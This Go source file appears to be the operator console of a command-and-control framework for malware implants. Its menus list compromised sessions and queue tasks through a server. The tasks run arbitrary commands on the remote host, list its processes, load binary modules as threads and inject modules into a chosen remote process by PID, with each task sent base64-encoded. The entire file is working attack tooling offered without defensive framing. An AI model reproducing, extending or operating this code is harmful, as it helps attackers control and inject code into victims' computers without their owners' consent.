package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"strconv"

	"github.com/inancgumus/screen"
)

const (
	sessionsMenu = `
	
Session Menu:

[+] sessions       [List Available Sessions]
[+] interact <id>  [Interact With Target Session]
[+] clear          [Clear Screen]
[+] back           [Back to Main Menu]
[+] help           [Print This Help Menu]`

	sessionControl = `

Session Control:

[+] tasks                 [ List Tasking Queue ]
[+] task <id>             [ Inspect Tasking Reponse ]
[+] ps                    [ List Process on Remote Host ]
[+] cmd <command>         [ Run a Command on Remote Host ]
[+] load <module>         [ Load a Module (Local Binary (bin) File) as Thread ]
[+] inject <module> <pid> [ Inject Module (Local Binary (bin) File) into a Remote Process ]
[+] clear                 [ Clear Screen ]
[+] back                  [ Back to Session Menu ]
[+] help                  [ Print This Help Menu ]`
)

func sessionMenu() {

	var opt string
	var session string
	fmt.Println(sessionsMenu + "\n")

	for true {

		fmt.Print(sess.username + "@" + sess.host + " > ")
		var r = bufio.NewReader(os.Stdin)
		fmt.Fscanf(r, "%s", &opt)

		if opt == "sessions" {

			opt = ""
			getSessions()

		} else if opt == "interact" {

			opt = ""
			fmt.Fscanf(r, "%s", &session)
			interactionMenu(session)

		} else if opt == "help" {

			opt = ""
			fmt.Println(sessionsMenu + "\n")

		} else if opt == "clear" {

			opt = ""
			screen.Clear()

		} else if opt == "back" {

			break

		} else {

			fmt.Println("[!] Do you ever read the help menu?")
			opt = ""

		}

	}

}

func getSessions() {

	type session struct {
		Sessionid    string
		Implanttype  string
		Computername string
	}

	var sessns []session
	url := sess.url + "/sessions"

	resp, _ := sess.client.Get(url)
	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	json.Unmarshal(b, &sessns)

	fmt.Println("\nCurrent Sessions:")

	for i := 0; i < len(sessns); i++ {

		fmt.Println("[+] ", sessns[i].Sessionid, "|", sessns[i].Implanttype, "|", sessns[i].Computername)

	}
	fmt.Println() // prettyfying it

}

func interactionMenu(sessionid string) {

	type Task struct {
		TASKID string
		TASK   string
		METHOD string
		TARGET string
		DATA   string
	}
	var opt string
	fmt.Println(sessionControl + "\n")

	for true {

		var r = bufio.NewReader(os.Stdin)
		fmt.Print(sessionid + " > ")
		fmt.Fscanf(r, "%s", &opt)

		var taskid string

		if opt == "help" {

			opt = ""
			fmt.Println(sessionControl + "\n")

		} else if opt == "clear" {

			opt = ""
			screen.Clear()

		} else if opt == "tasks" {

			opt = ""
			getTasks(sessionid)

		} else if opt == "task" {

			opt = ""
			fmt.Fscanf(r, "%s", &taskid)
			fetchTask(sessionid, taskid)

		} else if opt == "cmd" {

			opt = ""
			var task Task
			task.TASK = "1"
			fmt.Fscanf(r, "%s", &task.DATA)

			jtask, _ := json.Marshal(&task)
			pdata := base64.StdEncoding.EncodeToString(jtask)

			postTask(sessionid, pdata)

		} else if opt == "ps" {

			opt = ""
			var task Task
			task.TASK = "2"

			jtask, _ := json.Marshal(&task)
			pdata := base64.StdEncoding.EncodeToString(jtask)

			postTask(sessionid, pdata)

		} else if opt == "load" {

			opt = ""
			var task Task
			var module string
			task.TASK = "3"

			fmt.Fscanf(r, "%s", &module)

			if module != "" {

				data, err := ioutil.ReadFile(module)
				if err != nil {

					fmt.Println("[!] Unable to read local binary")

				} else {

					fmt.Println("[+] Preparing to load", module)
					task.DATA = base64.StdEncoding.EncodeToString(data)
					jtask, _ := json.Marshal(&task)
					pdata := base64.StdEncoding.EncodeToString(jtask)

					postTask(sessionid, pdata)

				}
			} else {

				fmt.Println("[!] Unknown Module!")

			}

		} else if opt == "inject" {

			opt = ""
			var task Task
			var module string
			task.TASK = "4"

			fmt.Fscanf(r, "%s", &module)
			fmt.Fscanf(r, "%s", &task.TARGET)

			if module != "" {

				if _, err := strconv.Atoi(task.TARGET); err == nil {

					data, err := ioutil.ReadFile(module)
					if err != nil {

						fmt.Println("[!] Unable to read local binary")

					} else {

						fmt.Println("[+] Preparing to inject", module)
						task.DATA = base64.StdEncoding.EncodeToString(data)
						jtask, _ := json.Marshal(&task)
						pdata := base64.StdEncoding.EncodeToString(jtask)

						postTask(sessionid, pdata)

					}
				} else {

					fmt.Println("[!] Target PID is Not a Valid Integer")

				}

			} else {

				fmt.Println("[!] Unknown Module!")

			}

		} else if opt == "back" {

			break

		} else {

			fmt.Println("[!] Do you ever read the help menu?")
			opt = ""

		}

	}

}

func getTasks(sessionid string) {

	type DBTask struct {
		TASKID    string
		SESSIONID string
		COMPLETE  bool
		TASK      string
		METHOD    string
		TARGET    string
		DATA      string
		RESPONSE  string
	}

	var tasks []DBTask
	url := sess.url + "/tasks/" + sessionid

	resp, _ := sess.client.Get(url)
	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	json.Unmarshal(b, &tasks)

	for i := 0; i < len(tasks); i++ {

		fmt.Println("[+] Task ID: ", tasks[i].TASKID, " | Complete: ", tasks[i].COMPLETE)

	}
	fmt.Println() // prettyfying it

}

func fetchTask(sessionid string, taskid string) {

	url := sess.url + "/task/" + sessionid + "/taskid/" + taskid
	resp, _ := sess.client.Get(url)
	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	fmt.Println(string(b))
	fmt.Println()

}

func postTask(sessionid string, task string) {

	uri := sess.url + "/task/" + sessionid

	resp, _ := sess.client.PostForm(uri, url.Values{"task": {task}})
	b, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	fmt.Println(string(b))

}
